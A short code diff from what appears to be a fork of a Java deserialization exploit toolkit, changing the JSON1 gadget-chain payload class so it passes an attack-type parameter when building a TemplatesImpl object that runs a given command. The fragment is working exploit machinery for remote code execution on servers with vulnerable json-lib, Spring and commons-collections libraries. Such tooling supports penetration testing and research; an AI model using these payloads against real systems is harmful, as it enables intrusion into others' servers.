@@ -67,9 +67,11 @@ import net.sf.json.JSONObject;
     "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
 @Authors({ Authors.MBECHLER })
 public class JSON1 implements ObjectPayload<Object> {
+	
+	// federicodotta - All supported (templateImpl)
 
     public Map getObject ( String command, String attackType) throws Exception {
-        return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
+        return makeCallerChain(Gadgets.createTemplatesImpl(command, attackType), Templates.class);
     }
 
 
